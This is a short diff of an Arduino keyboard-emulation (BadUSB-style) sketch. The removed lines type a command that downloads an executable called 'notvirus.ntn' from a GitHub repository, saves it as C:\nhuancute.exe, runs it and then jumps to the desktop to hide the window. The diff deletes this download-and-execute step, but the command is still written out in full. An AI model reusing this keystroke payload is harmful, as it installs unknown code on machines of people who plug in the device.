@@ -63,15 +63,7 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(500);
-  //Download and execute 
-  Keyboard.print("wget  https://github.com/Nguyennhuan2408/notHID/raw/main/notvirus.ntn -O C:\\nhuancute.exe; & C:\\nhuancute.exe");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(500);
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('D');
-  Keyboard.releaseAll();
-   // Release all Key
+  // Release all Key
   Keyboard.releaseAll();
   Keyboard.end();
 }
